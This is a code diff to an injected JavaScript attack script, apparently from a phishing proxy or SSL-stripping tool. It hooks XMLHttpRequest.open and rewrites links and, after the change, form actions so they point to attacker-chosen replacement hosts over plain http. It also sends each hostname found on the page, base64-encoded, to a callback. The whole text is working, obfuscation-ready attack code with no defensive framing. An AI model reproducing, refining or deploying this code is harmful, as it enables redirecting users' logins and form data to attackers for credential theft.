@@ -4,7 +4,7 @@ XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
 XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
 	for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
 		obf_var_path = obf_var_url.replace(/.*(\/.*)\s*$/, "$1")
-		obf_var_url = obf_var_url.replace(/^\s*http(s|):\/\//i, "").replace(/:433/, "").replace(/\/.*/, "").replace(/\s*$/, "")
+		obf_var_url = obf_var_url.replace(/^\s*http[s]?:\/\//i, "").replace(/:433/, "").replace(/\/.*/, "").replace(/\s*$/, "")
 		obf_var_regexp = new RegExp("^" + obf_var_target_hosts[obf_var_i].replace(/\-/g, "\\-").replace("*.", "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)").replace(/\./g, "\\.") + "$", "i")
 		if (obf_var_url.match(obf_var_regexp)) {
 			obf_var_replacement = "$1" + obf_var_replacement_hosts[obf_var_i].replace("*.", "")
@@ -24,21 +24,22 @@ function obf_func_callback(obf_var_data) {
 function obf_func_attack() {
 	try {
 		for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
-			document.querySelectorAll("a").forEach(function(obf_var_a){
-				obf_var_url = obf_var_a.href
+			document.querySelectorAll("a, form").forEach(function(obf_var_node){
+				obf_var_node.tagName == "A" ? obf_var_url = obf_var_node.href : obf_var_url = obf_var_node.action
 				obf_var_path = obf_var_url.replace(/.*(\/.*|)$/, "$1")
-				obf_var_url = obf_var_url.replace(/^\s*http(?:s|):\/\//i, "").replace(/:433/, "").replace(/\/.*/, "")
+				obf_var_host = obf_var_url.replace(/^\s*http[s]?:\/\//i, "").replace(/:433/, "").replace(/\/.*/, "")
 				obf_var_regexp = new RegExp("^" + obf_var_target_hosts[obf_var_i].replace(/\-/g, "\\-").replace("*.", "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)").replace(/\./g, "\\.") + "$", "i")
 				if (obf_var_url.match(obf_var_regexp)) {
 					obf_var_replacement = "$1" + obf_var_replacement_hosts[obf_var_i].replace("*.", "")
-					obf_var_url = obf_var_url.replace(obf_var_regexp, obf_var_replacement)
-					obf_var_a.href = "http://" + obf_var_url + obf_var_path
+					obf_var_host = obf_var_host.replace(obf_var_regexp, obf_var_replacement)
+					obf_var_node.tagName == "A" ? obf_var_node.href = "http://" + obf_var_host + obf_var_path : obf_var_node.action = "http://" + obf_var_host + obf_var_path
 				}
 			})
 		}
-		obf_var_urls = document.body.innerHTML.match(/http(?:s|)\:\/\/(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63})(?::80|:443){0,1}/ig)
+		obf_var_regexp = new RegExp("http[s]?:\\/\\/((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+(?:[a-z]{1,63}))(?::80|:443){0,1}", "ig")
+		obf_var_urls = document.body.innerHTML.match(obf_var_regexp)
 		for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {
-			obf_var_host = obf_var_urls[obf_var_i].replace(/http(?:s|)\:\/\//, "").replace(/:(?:80|443)$/, "")
+			obf_var_host = obf_var_urls[obf_var_i].replace(obf_var_regexp, "$1")
 			if (obf_var_callback_log.indexOf(obf_var_host) == -1) {
 				obf_func_callback(btoa(obf_var_host))
 				obf_var_callback_log.push(obf_var_host)
